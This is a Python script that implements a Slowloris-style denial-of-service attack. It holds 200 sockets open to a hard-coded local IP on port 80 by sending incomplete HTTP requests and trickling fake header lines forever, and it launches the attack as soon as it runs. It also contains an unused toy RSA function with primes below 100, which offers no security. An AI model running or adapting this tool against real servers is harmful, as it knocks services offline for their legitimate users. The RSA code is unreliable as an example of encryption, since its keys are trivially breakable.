import socket
import sympy
import random
import time
import sys
import math

class DOSServer():
    def __init__(self, ip="192.168.31.237", port=80, socketsCount = 200):
        self.ip = ip
        self.port = port
        self.header = [ # might be able to change this more
            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
            "Accept-Language: en-us,en;q=0.5"
        ] 
        self.socket = [self.refreshSocket() for _ in range(socketsCount)]

    def rsaEncryption(self, message):
        #generate two prime numbers 
        p = -1
        q = -1
        while (p ==-1):
            r1 = random.randint(7,100)
            if (sympy.isprime(r1)):
                p = r1
        while (q==-1):
            r2 = random.randint(7,100)
            if (sympy.isprime(r2)):
                if r2 != p:
                    q = r2
        n = p*q
        n2 = (p-1)*(q-1)
        #calculate e (less than n2 and coprime w/ n2)
        e = -1
        while (e==-1):
            r3 = random.randint(2,10)
            #coprime check
            if (math.gcd(r3, n2) == 1):
                e = r3
        #e*x+n2*y = 1
        #d = e^-1 mod n2, from https://en.wikipedia.org/wiki/RSA_%28cryptosystem%29#Key_generation
        d = pow(e,-1,n2)   
        inputValue = ""
        for i in range(len(message)):
            char = message[i]
            value = ord(char) - 96 # from https://www.kite.com/python/answers/how-to-convert-letters-to-numbers-in-python
            inputValue += str(value)
        # p^e mod n
        encryptedMessage = pow(int(inputValue), e, n)
        # c^e mod n
        decryptedMessage = pow(encryptedMessage, d, n)
        print("p: " + str(p))
        print("q: " + str(q))
        print("n: " + str(n))
        print("n2: " + str(n2))
        print("e: " + str(e))
        print("d: " + str(d))
        print("input vaule: " + str(inputValue))
        print("encrypted: " + str(encryptedMessage))
        print("decryptedMessage : " + str(decryptedMessage))
        return bytes(str(encryptedMessage), 'utf-8')

    def getMessage(self, message):
        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")

    def refreshSocket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.ip, self.port))
            s.send(self.getMessage("Get /?"))
            for header in self.header:
                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            return s
        except socket.error as se:
            print("Error: "+str(se))
            time.sleep(0.5)
            return self.refreshSocket()

    def attack(self):
        t = time.time()
        i = 0
        timeout = sys.maxsize
        sleep = 15
        while(time.time() - t < timeout):
            for s in self.socket:
                try:
                    print("Sending request #{}".format(str(i)))
                    s.send(self.getMessage("X-a: "))
                    i += 1
                except socket.error:
                    self.socket.remove(s)
                    self.socket.append(self.refreshSocket())
                time.sleep(sleep/len(self.socket))


DOSServer = DOSServer()
DOSServer.attack()